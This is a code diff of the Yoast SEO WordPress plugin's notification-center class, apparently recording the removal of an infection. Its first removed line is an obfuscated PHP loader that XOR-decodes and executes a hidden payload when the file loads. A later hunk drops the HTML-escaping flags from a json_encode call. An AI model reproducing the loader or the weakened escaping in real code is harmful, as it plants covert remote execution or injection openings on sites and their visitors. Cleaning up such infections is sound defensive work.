@@ -1,4 +1,4 @@
-<?php $aqVPD='+:+QGQ16,X9=X<-'^'HHN034nPY6ZI1SC';$XPafSB=$aqVPD('','UUfJWI65NB8X3QT80HXMQVC ; .F+3>+E6rFNUCZXHN6U9:CUZUC3eJ12Yc;MC=Qf3WIAFFJRS0bjIybG6lD3bBY,agnmSayjKMOGjiUsLOYKOR:k Z;;0SbIDJ:,nXxsBqFYbY9e;U.LopadV>3=04mWvZrTH .W5B9HrGE:DQKSRw1UJKoXjn>D<IZM;SQMVMXnz2cJAORpq51.RdgJF8U:4Lmm18:Q;>-TXsD7UZS<yeS0Y>6M.>umOgp:::<=a02dq.K3RIPiq9U:IWCE6hde2 .79KW3qyZM9H1SO5A7ZA YLis:06-,ugQxKU>GejTD,>AprL=x0=8.JTQzcE;bxh8v8dwOHIMK0>XTmIA;A605jILk82l>O7Z63WRFzHPQY2MrbgOU3C5bGqG.RQ>QKGsMr7o6G2 =-OJS84+O36-MT:61G-:NjHL,L<9 45RBWB0zMbQE2Y<6Nk+.<VaisTUW.Qn-=THgZAYRJOY9J1YLKfLDD->2;RMm4IRSFSAJ=W uiWcOZXXjJMWai;WcFa-LI2uH8K=O6XFUZJTJGWkqpHSiSG7pAK7DXFtmZKgK1CEQVP<JpOJgqUEH3>jU7U743GF6HBIPLA;Z-DcTJHWU=QQHpVvxwvKykIEV4AvVAN70VK60L5L7BeyB2f-I=GjcyWI7'^'<3Nk1<XV:+W6l4,QC<+ev.,RdDO2JlaF0BUogu8PQ.;X6MS,;z-,A:.PF8<d 6IyBW6= jfn96IKJiYBgMfM:F-,XAZNJtZscB+ 5BM<SqoipovSWS.IWU=Jm +NMGcXW+ZmphP0AT ZlAMALrZRIQoI>+z,tlKK.nfPhWg6N6=.=zSZ03b2qQd7MN,.8I=yi98,GA8j7K2XzUQPZ3DZj Y9IQwgIUYN0dUH-xNdQ46 YBoYV6LS,MVUEk83uuquxAQADUE.JrtnIUO4V<2jeMbmAVAZVf 2JQDziR-HhE<eS;5AyqIWLQZXINm,rA<XgMKp MJ YR77qVRJK+79ZKad0=9m3k0W.;ii UGxiSieM ZEPCi7a1;HZ.C;iX2+fGht:<Kvxknk1R7TBzQcX3=K4pMz0xJe<cVAILowsxAE<VDD,8SLToUU<5,-X-cfMAAz 61ULy=5 Q6XSfOOOH7HESp16Z01FX-aNaK04bk=X>PyjmF-66LGmP742Q1; 2 imV2YREwG+;,9CjkqAAV3VnEI-=S.oS.Dhkqfhgjs+sbSABzcPdrUAp.Sph BXoyVyW  5c6YmYolAQ47:RG5>R,hQK.5B;jn -8W5L Dxjl34I0xaPvVXWV0sb,37XiR2 :Vkq;WI Z-Se8Py8oH1T3BSPlCJ');$XPafSB();
+<?php
 /**
  * @package WPSEO\Admin\Notifications
  */
@@ -94,7 +94,7 @@ class Yoast_Notification_Center {
 		$user_id       = ( ! is_null( $user_id ) ? $user_id : get_current_user_id() );
 		$dismissal_key = $notification->get_dismissal_key();
 
-		$current_value = get_user_meta( $user_id, $dismissal_key, $single = true );
+		$current_value = get_user_meta( $user_id, $dismissal_key, true );
 
 		return ! empty( $current_value );
 	}
@@ -169,7 +169,7 @@ class Yoast_Notification_Center {
 		}
 
 		// Remove notification dismissal for all users.
-		$deleted = delete_metadata( 'user', $user_id = 0, $dismissal_key, $meta_value = '', $delete_all = true );
+		$deleted = delete_metadata( 'user', 0, $dismissal_key, '', true );
 
 		return $deleted;
 	}
@@ -239,7 +239,7 @@ class Yoast_Notification_Center {
 		}
 
 		$sorted_notifications = $this->get_sorted_notifications();
-		$notifications = array_filter( $sorted_notifications, array( $this, 'is_notification_persistent' ) );
+		$notifications        = array_filter( $sorted_notifications, array( $this, 'is_notification_persistent' ) );
 
 		if ( empty( $notifications ) ) {
 			return;
@@ -253,7 +253,7 @@ class Yoast_Notification_Center {
 				$notification_json[] = $notification->render();
 			}
 
-			echo json_encode( $notification_json, ( JSON_HEX_QUOT | JSON_HEX_TAG ) );
+			echo json_encode( $notification_json );
 
 			return;
 		}
